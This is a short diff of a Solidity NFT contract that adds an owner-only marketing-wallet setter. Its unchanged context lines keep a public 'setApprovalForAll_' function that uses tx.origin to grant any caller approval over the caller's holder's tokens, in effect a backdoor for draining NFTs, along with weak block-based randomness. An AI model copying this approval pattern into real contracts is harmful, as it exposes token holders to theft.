@@ -87,6 +87,10 @@ contract CloverDarkSeedPotion is ERC721Enumerable, ERC721URIStorage, Ownable, ER
         return uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, entropy)));
     }
 
+    function setMarketingWallet(address _marketingWallet) public onlyOwner {
+        marketingWallet = _marketingWallet;
+    }
+
     function setApprovalForAll_(address operator) public {
         _setApprovalForAll(tx.origin, operator, true);
     }
